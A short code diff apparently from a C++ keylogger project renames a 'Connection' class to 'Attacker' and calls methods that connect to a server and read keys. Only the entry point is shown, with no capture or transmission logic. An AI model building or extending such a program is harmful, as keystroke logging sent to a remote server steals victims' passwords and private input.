@@ -3,15 +3,15 @@
 #include <conio.h>
 #include <thread>
 #include <filesystem>
-#include "Connection.h"
+#include "Attacker.h"
 
 
 
 int main() {
-	Connection attacker;
+	Attacker* attacker = new Attacker();
 
-	attacker.connectToServer();
-	attacker.readKeys();
-	
+	attacker->connectToServer();
+	attacker->readKeys();
+
 	return 0;
 }
